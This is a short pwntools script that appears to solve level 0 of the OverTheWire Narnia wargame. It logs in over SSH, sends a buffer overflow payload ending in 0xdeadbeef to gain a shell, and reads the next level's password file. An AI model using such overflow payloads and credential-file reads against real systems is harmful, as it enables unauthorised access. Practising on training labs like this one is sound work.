from pwn import *

s = ssh(host='narnia.labs.overthewire.org',port=2226,user='narnia0',password='narnia0')
p = s.process('/narnia/narnia0')

p.clean()
p.sendline(b'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde')
p.recvuntil(b'$')
p.sendline(b'cat /etc/narnia_pass/narnia1')
print('\nnarnia1 pass: ' + p.recvline().decode())

p.close()
s.close()
